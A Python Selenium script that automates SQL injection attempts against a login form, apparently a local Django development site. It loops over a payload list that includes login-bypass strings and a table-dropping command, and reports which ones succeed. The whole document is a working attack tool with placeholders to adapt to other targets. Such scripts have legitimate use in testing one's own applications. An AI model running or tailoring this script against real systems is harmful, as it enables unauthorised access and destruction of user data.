from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Define common SQL Injection payloads
sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR '1'='1' --",
    "'; DROP TABLE users --",
    "' OR EXISTS(SELECT * FROM users) --"
]

# Setup WebDriver
options = webdriver.ChromeOptions()
# options.add_argument("--headless")  # Run in background (uncomment to enable)
driver = webdriver.Chrome(options=options)

# Target login page
target_url = "http://127.0.0.1:8000/accounts/login/"

try:
    driver.get(target_url)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

    for payload in sql_payloads:
        print(f"Trying payload: {payload}")

        try:
            # Find username and password fields (inside loop to refresh each attempt)
            username_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))  # Change if needed
            )
            password_field = driver.find_element(By.NAME, "password")  # Change if needed

            # Inject SQL payload
            username_field.clear()
            password_field.clear()
            username_field.send_keys(payload)
            password_field.send_keys("password")  # Dummy password
            password_field.send_keys(Keys.RETURN)

            # Wait for response
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

            # Check if login was successful (Modify based on site response)
            if "dashboard" in driver.current_url or "Welcome" in driver.page_source:
                print(f"✅ Injection SUCCESS with payload: {payload}")
            else:
                print(f"❌ Injection FAILED with payload: {payload}")

        except Exception as e:
            print(f"❌ Error during payload execution: {e}")

except Exception as e:
    print(f"❌ Fatal error: {e}")

finally:
    driver.quit()
